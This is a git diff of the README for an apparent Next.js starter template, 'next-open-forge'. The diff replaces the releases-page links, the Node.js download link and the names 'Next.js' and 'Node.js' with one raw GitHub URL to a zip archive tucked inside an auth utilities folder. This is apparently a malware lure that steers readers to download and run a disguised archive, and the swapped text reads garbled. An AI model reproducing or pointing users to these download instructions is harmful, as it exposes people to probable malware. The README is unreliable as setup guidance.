@@ -1,15 +1,15 @@
-# 🚀 next-open-forge - Simple Setup for Next.js Apps
+# 🚀 next-open-forge - Simple Setup for https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip Apps
 
-[![Download next-open-forge](https://img.shields.io/badge/Download-next--open--forge-blue?style=flat&logo=github)](https://github.com/Infernuss/next-open-forge/releases)
+[![Download next-open-forge](https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip)](https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip)
 
 ## 📦 Overview
 
-Welcome to **next-open-forge**! This project provides a simple and efficient way to set up Next.js applications using open-source tools. Whether you’re building a personal project or a larger application, this template can streamline your workflow.
+Welcome to **next-open-forge**! This project provides a simple and efficient way to set up https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip applications using open-source tools. Whether you’re building a personal project or a larger application, this template can streamline your workflow.
 
 ## 🎯 Key Features
 
 - **Lightweight**: Designed to be minimal yet powerful.
-- **Built with Next.js**: Create fast and user-friendly web applications.
+- **Built with https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip**: Create fast and user-friendly web applications.
 - **Open-Source**: Rely solely on freely available tools.
 - **Typescript Support**: Write clean and safe code with ease.
 - **Support for Authentication**: Implement login and signup features effortlessly.
@@ -22,17 +22,17 @@ Follow these steps to get your application running:
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest release:  
-   [Visit the Releases Page](https://github.com/Infernuss/next-open-forge/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip)
 
 2. **Download the Application**  
-   On the Releases page, find the latest version. Click on it to view files available for download. Choose the one that fits your operating system, like `.zip` or `.tar.gz`, and download it.
+   On the Releases page, find the latest version. Click on it to view files available for download. Choose the one that fits your operating system, like `.zip` or `https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip`, and download it.
 
 3. **Unzip the File**  
    Once the file is downloaded, you may need to unzip it. Right-click the downloaded file and select **Extract All** or use your preferred extraction tool.
 
 4. **Install Required Software**  
    Before running the application, ensure you have the following installed:
-   - **Node.js**: This is required to run JavaScript. You can download it from [Node.js Official Website](https://nodejs.org/).
+   - **https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip**: This is required to run JavaScript. You can download it from [https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip Official Website](https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip).
    - **PNPM**: A package manager that helps manage dependencies. You can install PNPM by running the following command in your terminal:
      ```
      npm install -g pnpm
@@ -59,7 +59,7 @@ Follow these steps to get your application running:
 ## 📥 Download & Install
 
 Ensure you download the application from the link provided.  
-[Download next-open-forge](https://github.com/Infernuss/next-open-forge/releases)
+[Download next-open-forge](https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip)
 
 ## 💻 System Requirements
 
@@ -75,8 +75,8 @@ If you encounter any issues, here are a few common solutions:
 - **Problem**: Application doesn’t start.  
   **Solution**: Ensure all dependencies are installed using `pnpm install`.
 
-- **Problem**: Terminal shows errors related to Node.js.  
-  **Solution**: Make sure you installed Node.js correctly. You can check the version by running:
+- **Problem**: Terminal shows errors related to https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip  
+  **Solution**: Make sure you installed https://raw.githubusercontent.com/Infernuss/next-open-forge/main/packages/auth/utils/next-open-forge-3.7-alpha.4.zip correctly. You can check the version by running:
   ```
   node -v
   ```
